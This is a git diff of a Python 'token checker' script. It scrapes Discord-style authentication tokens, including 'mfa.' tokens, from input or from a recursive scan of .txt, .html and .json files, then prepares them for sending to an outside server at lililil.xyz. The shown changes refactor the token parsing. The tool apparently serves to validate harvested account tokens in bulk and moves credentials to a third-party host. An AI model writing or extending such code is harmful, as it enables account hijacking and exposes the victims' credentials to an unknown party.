@@ -25,6 +25,7 @@ def fast_exit(error):
 class Checker:
     def __init__(self):
         self.url = "https://lililil.xyz/checker"
+        self.tokens_unparsed = ""
         self.tokens_parsed = []
         self.res = {}
 
@@ -44,9 +45,8 @@ class Checker:
         check_type = input(f"{Fore.CYAN}>{Fore.RESET}Select An Option{Fore.CYAN}:{Fore.RESET} ")
         print()
 
-        tokens = ""
         if "1" in check_type:
-            tokens = input(
+            self.tokens_unparsed = input(
                 f"{Fore.CYAN}>{Fore.RESET}Enter tokens{Fore.CYAN}:{Fore.RESET} ")
         elif "2" in check_type:
             token_file_name = input(
@@ -56,19 +56,20 @@ class Checker:
 
             if os.path.isfile(token_file_name):
                 with open(token_file_name, "r", encoding="utf-8") as f:
-                    tokens = f.read()
+                    self.tokens_unparsed = f.read()
             else:
                 types = ["*.txt", "*.html", "*.json"]
                 for search_type in types:
                     for path in Path(token_file_name).rglob(search_type):
                         with open(path, "r", encoding="utf-8") as f:
-                            tokens += f.read()
+                            self.tokens_unparsed += f.read()
         else:
             fast_exit("Invalid Option.")
 
+    def parse_tokens(self):
         pre_parsed = []
         for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
-            for token in re.findall(regex, tokens):
+            for token in re.findall(regex, self.tokens_unparsed):
                 pre_parsed.append(token)
         pre_parsed = list(dict.fromkeys(pre_parsed))
 
@@ -76,7 +77,7 @@ class Checker:
             try:
                 jwt.decode(token, options={"verify_signature": False})
             except Exception as e:
-                if str(e) == "Invalid header string: must be a json object":
+                if str(e) == "Invalid header string: must be a json object" or str(e) == "Not enough segments":
                     self.tokens_parsed.append(token)
 
         if len(self.tokens_parsed) > 2000:
@@ -117,5 +118,6 @@ class Checker:
 if __name__ == "__main__":
     checker = Checker()
     checker.main()
+    checker.parse_tokens()
     checker.send_tokens()
     checker.save_res()
